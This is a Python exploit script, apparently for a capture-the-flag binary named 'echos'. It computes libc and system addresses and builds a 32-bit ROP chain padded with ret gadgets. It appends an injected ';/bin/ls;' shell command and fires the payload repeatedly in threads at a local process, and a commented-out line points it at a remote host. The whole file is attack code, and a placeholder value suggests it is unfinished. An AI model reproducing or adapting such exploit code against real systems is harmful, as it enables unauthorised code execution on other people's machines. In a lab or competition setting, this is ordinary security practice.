from ptrlib import *
import time
import threading

#libc = ELF("./libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_base = 0xf7f7fcb0 - 0xe6cb0
#print(hex(0xf7f7fcb0 - 0xa9ab0))
print(hex(libc_base + libc.symbol("system")))
rop_ret = 0x08048436

payload = b"\xf7\xf7" # read
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(0xcafebabe) # atoi
payload += p32(rop_ret)
payload += b";/bin/ls;"

def worker():
    try:
        #sock = Socket("10.66.20.180", 3000)
        sock = Process("./echos")
        sock.sendline("8000")
        sock.sendline(payload)
        time.sleep(1.0)
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
    except:
        pass
    finally:
        sock.close()

while True:
    th = threading.Thread(target=worker, args=())
    th.start()
    time.sleep(0.1)

    
